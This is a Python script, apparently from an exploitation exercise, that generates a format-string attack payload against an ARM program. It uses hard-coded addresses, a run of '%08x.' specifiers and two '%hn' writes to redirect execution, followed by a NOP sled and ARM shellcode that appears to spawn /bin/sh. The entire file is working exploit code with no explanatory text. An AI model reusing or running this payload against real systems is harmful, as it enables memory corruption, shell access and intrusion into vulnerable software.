import sys
import os
NOPSLED = b'\x01\x10\x81\xe1'
NOPSLED = NOPSLED * 0x20

SHELLCODE = b'hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 "\xe0\x0bp\xa0\xe3\x00\x00\x00\xef'

ADDRESSTOWRITE = b'7EFFE4E8'
i = 1
ADDRESSOFSHELL = b'\xBF\xFF\xEF\xC8'
ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
ADDRESSOFSHELL.reverse()
ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)

ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[2:], 'little') - 5540
ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little') - ADDRESSOFSHELL1 - 5540
ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
print(ADDRESSOFSHELL1)
#ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540
#ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
#ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
#ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')

ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')

ADDRESSOFSTRING = b'7EFFE9C0'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
LENTGHOFREQUIRED = 313

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x.'*312 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + NOPSLED + SHELLCODE + b'\n')